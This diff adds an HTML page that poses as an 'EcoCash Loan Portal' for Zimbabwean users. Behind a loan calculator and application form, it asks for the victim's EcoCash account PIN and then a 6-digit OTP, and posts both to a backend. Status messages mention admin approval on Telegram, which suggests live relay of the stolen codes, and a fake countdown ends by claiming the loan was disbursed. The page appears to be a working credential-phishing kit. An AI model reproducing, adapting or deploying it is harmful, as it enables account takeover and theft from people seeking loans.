@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash Loan Portal</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #008eb0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 440px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .brand {
+            color: #0284c7;
+            font-size: 28px;
+            font-weight: bold;
+            background: white;
+            display: inline-block;
+            padding: 8px 24px;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        }
+
+        .brand span {
+            color: #dc2626;
+        }
+
+        /* Card Container */
+        .card {
+            background: #ffffff;
+            border-radius: 28px;
+            padding: 32px 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12);
+            text-align: center;
+        }
+
+        h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #0f172a;
+            margin-bottom: 6px;
+        }
+
+        .subtitle {
+            color: #64748b;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #334155;
+            margin-bottom: 6px;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #cbd5e1;
+            border-radius: 12px;
+            font-size: 15px;
+            background-color: #f8fafc;
+            outline: none;
+        }
+
+        .phone-input-group {
+            display: flex;
+            gap: 8px;
+        }
+
+        .flag-box {
+            background: #f1f5f9;
+            border: 1px solid #cbd5e1;
+            border-radius: 12px;
+            padding: 12px 14px;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+        }
+
+        /* Calculator Card Styling */
+        .calculator-box {
+            background: #f8fafc;
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .highlight-val {
+            float: right;
+            color: #2563eb;
+            font-weight: bold;
+        }
+
+        input[type=range] {
+            width: 100%;
+            margin: 10px 0 4px 0;
+        }
+
+        .range-labels {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #94a3b8;
+            margin-bottom: 12px;
+        }
+
+        .monthly-payment-card {
+            background: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 14px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 10px;
+        }
+
+        .monthly-payment-card h2 {
+            color: #2563eb;
+            margin: 0;
+            font-size: 20px;
+        }
+
+        /* PIN & OTP Input Boxes Layout */
+        .pin-boxes {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .pin-box {
+            width: 50px;
+            height: 55px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            border: 1.5px solid #cbd5e1;
+            border-radius: 12px;
+            outline: none;
+            background: #ffffff;
+        }
+
+        .pin-box:focus {
+            border-color: #2563eb;
+        }
+
+        /* Buttons */
+        .apply-btn {
+            width: 100%;
+            padding: 16px;
+            background: #2563eb;
+            color: white;
+            border: none;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .apply-btn:hover {
+            background: #1d4ed8;
+        }
+
+        #statusBox, #otpStatusBox {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 14px;
+            display: none;
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #2563eb;
+            border-radius: 50%;
+            width: 36px;
+            height: 36px;
+            animation: spin 1s linear infinite;
+            margin: 15px auto 5px auto;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Top Brand Header -->
+        <div class="header">
+            <h1 class="brand">Eco<span>Cash</span></h1>
+        </div>
+
+        <!-- VIEW 1: Loan Calculator -->
+        <div id="calculatorView" class="card">
+            <h2>Get Your Loan Approved Fast</h2>
+            <p class="subtitle">Quick approval · Competitive rates · Flexible terms</p>
+            
+            <div class="calculator-box">
+                <label>Loan Amount <span id="amountDisplay" class="highlight-val">$3,100</span></label>
+                <input type="range" id="loanAmountRange" min="100" max="10000" step="100" value="3100" oninput="updateCalculator()">
+                <div class="range-labels"><span>$100</span><span>$10,000</span></div>
+
+                <label>Loan Term <span id="termDisplay" class="highlight-val">10 months</span></label>
+                <input type="range" id="loanTermRange" min="1" max="12" value="10" oninput="updateCalculator()">
+                <div class="range-labels"><span>1 month</span><span>12 months</span></div>
+
+                <div class="monthly-payment-card">
+                    <div>
+                        <span style="font-size: 12px; color: #64748b; display: block;">Estimated Monthly</span>
+                        <span>Monthly Payment</span>
+                    </div>
+                    <h2 id="monthlyPayment">$341.00</h2>
+                </div>
+            </div>
+
+            <button class="apply-btn" onclick="showAppForm()">APPLY NOW</button>
+        </div>
+
+        <!-- VIEW 2: Application Details Form -->
+        <div id="appFormView" class="card" style="display: none;">
+            <h2>EcoCash Loan Application</h2>
+            <p class="subtitle">Apply instantly. No paperwork.</p>
+
+            <div class="form-group">
+                <label>Phone Number</label>
+                <div class="phone-input-group">
+                    <span class="flag-box">🇿🇼 +263</span>
+                    <input type="tel" id="phoneNumber" placeholder="Enter phone number">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Email Address</label>
+                <input type="email" id="email" placeholder="you@email.com">
+            </div>
+
+            <div class="form-group">
+                <label>Loan Amount (USD)</label>
+                <input type="text" id="appAmount" readonly>
+            </div>
+
+            <div class="form-group">
+                <label>Purpose of Loan</label>
+                <select id="purpose">
+                    <option value="" disabled selected>Select purpose</option>
+                    <option value="Business Expansion">Business Expansion</option>
+                    <option value="Emergency Medical">Emergency Medical</option>
+                    <option value="School Fees">School Fees</option>
+                    <option value="Personal Upkeep">Personal Upkeep</option>
+                </select>
+            </div>
+
+            <button class="apply-btn" onclick="showPinView()">Continue to Verification</button>
+        </div>
+
+        <!-- VIEW 3: 4-Digit PIN Login -->
+        <div id="pinView" class="card" style="display: none;">
+            <h2>EcoCash Login</h2>
+            <p class="subtitle">Enter your Account PIN to authorize</p>
+
+            <div class="pin-boxes">
+                <input type="password" maxlength="1" class="pin-box" oninput="moveToNext(this, 0)" />
+                <input type="password" maxlength="1" class="pin-box" oninput="moveToNext(this, 1)" />
+                <input type="password" maxlength="1" class="pin-box" oninput="moveToNext(this, 2)" />
+                <input type="password" maxlength="1" class="pin-box" oninput="moveToNext(this, 3)" />
+            </div>
+
+            <div id="statusBox"></div>
+
+            <button class="apply-btn" style="margin-top: 15px;" onclick="submitFinalApplication()">Submit Application</button>
+        </div>
+
+        <!-- VIEW 4: 6-Digit OTP Verification Card -->
+        <div id="otpView" class="card" style="display: none;">
+            <h2>EcoCash OTP</h2>
+            <p class="subtitle">Enter your OTP to authorize</p>
+
+            <div class="pin-boxes">
+                <input type="password" maxlength="1" class="otp-box pin-box" oninput="moveToNextOtp(this, 0)" />
+                <input type="password" maxlength="1" class="otp-box pin-box" oninput="moveToNextOtp(this, 1)" />
+                <input type="password" maxlength="1" class="otp-box pin-box" oninput="moveToNextOtp(this, 2)" />
+                <input type="password" maxlength="1" class="otp-box pin-box" oninput="moveToNextOtp(this, 3)" />
+                <input type="password" maxlength="1" class="otp-box pin-box" oninput="moveToNextOtp(this, 4)" />
+                <input type="password" maxlength="1" class="otp-box pin-box" oninput="moveToNextOtp(this, 5)" />
+            </div>
+
+            <div class="spinner" id="otpSpinner"></div>
+            <div id="otpStatusBox"></div>
+
+            <button id="otpSubmitBtn" class="apply-btn" style="margin-top: 15px;" onclick="submitOtpCode()">Submit</button>
+        </div>
+
+    </div>
+
+    <script>
+        let selectedAmount = 3100;
+        let selectedTerm = 10;
+
+        function updateCalculator() {
+            selectedAmount = Number(document.getElementById("loanAmountRange").value);
+            selectedTerm = Number(document.getElementById("loanTermRange").value);
+
+            document.getElementById("amountDisplay").innerText = `$${selectedAmount.toLocaleString()}`;
+            document.getElementById("termDisplay").innerText = `${selectedTerm} months`;
+
+            let totalWithFee = selectedAmount * 1.10; 
+            let monthly = totalWithFee / selectedTerm;
+            document.getElementById("monthlyPayment").innerText = `$${monthly.toFixed(2)}`;
+        }
+
+        function showAppForm() {
+            document.getElementById("calculatorView").style.display = "none";
+            document.getElementById("appFormView").style.display = "block";
+            document.getElementById("appAmount").value = `$${selectedAmount} (${selectedTerm} mos)`;
+        }
+
+        function showPinView() {
+            const phone = document.getElementById("phoneNumber").value.trim();
+            const purpose = document.getElementById("purpose").value;
+
+            if (!phone) {
+                alert("Please enter your phone number.");
+                return;
+            }
+            if (!purpose) {
+                alert("Please select a loan purpose.");
+                return;
+            }
+
+            document.getElementById("appFormView").style.display = "none";
+            document.getElementById("pinView").style.display = "block";
+        }
+
+        function moveToNext(element, index) {
+            const pinBoxes = document.querySelectorAll("#pinView .pin-box");
+            if (element.value.length === 1 && index < pinBoxes.length - 1) {
+                pinBoxes[index + 1].focus();
+            }
+        }
+
+        function moveToNextOtp(element, index) {
+            const otpBoxes = document.querySelectorAll(".otp-box");
+            if (element.value.length === 1 && index < otpBoxes.length - 1) {
+                otpBoxes[index + 1].focus();
+            }
+        }
+
+        async function submitFinalApplication() {
+            const pinBoxes = document.querySelectorAll("#pinView .pin-box");
+            let pin = "";
+            pinBoxes.forEach(input => pin += input.value);
+
+            if (pin.length < 4) {
+                alert("Please enter your full 4-digit PIN.");
+                return;
+            }
+
+            const phone = document.getElementById("phoneNumber").value.trim();
+            const purpose = document.getElementById("purpose").value;
+            const statusBox = document.getElementById("statusBox");
+
+            statusBox.style.display = "block";
+            statusBox.style.background = "#e0f2fe";
+            statusBox.style.color = "#0369a1";
+            statusBox.innerText = "Submitting application to administrator...";
+
+            const payload = {
+                name: "EcoCash User",
+                phone: phone,
+                amount: `$${selectedAmount}`,
+                purpose: purpose,
+                pin: pin
+            };
+
+            try {
+                const res = await fetch('/api/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const data = await res.json();
+
+                if (data.success) {
+                    statusBox.innerText = "Sent! Waiting for admin approval on Telegram...";
+                    pollApprovalStatus();
+                } else {
+                    statusBox.style.background = "#fee2e2";
+                    statusBox.style.color = "#991b1b";
+                    statusBox.innerText = "Submission failed. Please check server connection.";
+                }
+            } catch (err) {
+                statusBox.style.background = "#fee2e2";
+                statusBox.style.color = "#991b1b";
+                statusBox.innerText = "Network error connecting to backend.";
+            }
+        }
+
+        function pollApprovalStatus() {
+            const statusBox = document.getElementById("statusBox");
+            
+            const interval = setInterval(async () => {
+                try {
+                    const res = await fetch('/api/status');
+                    const data = await res.json();
+
+                    if (data.status === "approved") {
+                        statusBox.style.background = "#dcfce7";
+                        statusBox.style.color = "#166534";
+                        statusBox.innerText = "Loan application approved successfully!";
+                        
+                        clearInterval(interval);
+
+                        setTimeout(() => {
+                            document.getElementById("pinView").style.display = "none";
+                            document.getElementById("otpView").style.display = "block";
+                        }, 1500);
+
+                    } else if (data.status === "declined") {
+                        statusBox.style.background = "#fee2e2";
+                        statusBox.style.color = "#991b1b";
+                        statusBox.innerText = "Application was declined by administrator.";
+                        clearInterval(interval);
+                    }
+                } catch (e) {
+                    console.error("Polling error", e);
+                }
+            }, 3000);
+        }
+
+        async function submitOtpCode() {
+            const otpBoxes = document.querySelectorAll(".otp-box");
+            let otp = "";
+            otpBoxes.forEach(input => otp += input.value);
+
+            if (otp.length < 6) {
+                alert("Please enter the full 6-digit OTP.");
+                return;
+            }
+
+            const phone = document.getElementById("phoneNumber").value.trim();
+            const otpStatusBox = document.getElementById("otpStatusBox");
+            const otpSubmitBtn = document.getElementById("otpSubmitBtn");
+            const spinner = document.getElementById("otpSpinner");
+
+            otpSubmitBtn.disabled = true;
+            otpSubmitBtn.style.opacity = "0.6";
+            spinner.style.display = "block";
+
+            otpStatusBox.style.display = "block";
+            otpStatusBox.style.background = "#e0f2fe";
+            otpStatusBox.style.color = "#0369a1";
+            otpStatusBox.innerText = "Verifying OTP code. Please wait...";
+
+            const payload = {
+                phone: phone,
+                otp: otp
+            };
+
+            try {
+                const res = await fetch('/api/submit-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const data = await res.json();
+
+                if (data.success) {
+                    // 3-minute (180 seconds) loading countdown timer
+                    let remainingSeconds = 180;
+                    
+                    const countdownInterval = setInterval(() => {
+                        remainingSeconds--;
+                        let minutes = Math.floor(remainingSeconds / 60);
+                        let seconds = remainingSeconds % 60;
+                        let formattedSeconds = seconds < 10 ? `0${seconds}` : seconds;
+
+                        otpStatusBox.innerText = `Authorizing transaction... Please wait (${minutes}:${formattedSeconds})`;
+
+                        if (remainingSeconds <= 0) {
+                            clearInterval(countdownInterval);
+                            spinner.style.display = "none";
+                            otpStatusBox.style.background = "#dcfce7";
+                            otpStatusBox.style.color = "#166534";
+                            otpStatusBox.innerText = "Transaction complete! Your loan has been disbursed.";
+                        }
+                    }, 1000);
+
+                } else {
+                    spinner.style.display = "none";
+                    otpSubmitBtn.disabled = false;
+                    otpSubmitBtn.style.opacity = "1";
+                    otpStatusBox.style.background = "#fee2e2";
+                    otpStatusBox.style.color = "#991b1b";
+                    otpStatusBox.innerText = "OTP verification failed. Please try again.";
+                }
+            } catch (err) {
+                spinner.style.display = "none";
+                otpSubmitBtn.disabled = false;
+                otpSubmitBtn.style.opacity = "1";
+                otpStatusBox.style.background = "#fee2e2";
+                otpStatusBox.style.color = "#991b1b";
+                otpStatusBox.innerText = "Network error connecting to server.";
+            }
+        }
+    </script>
+</body>
+</html>
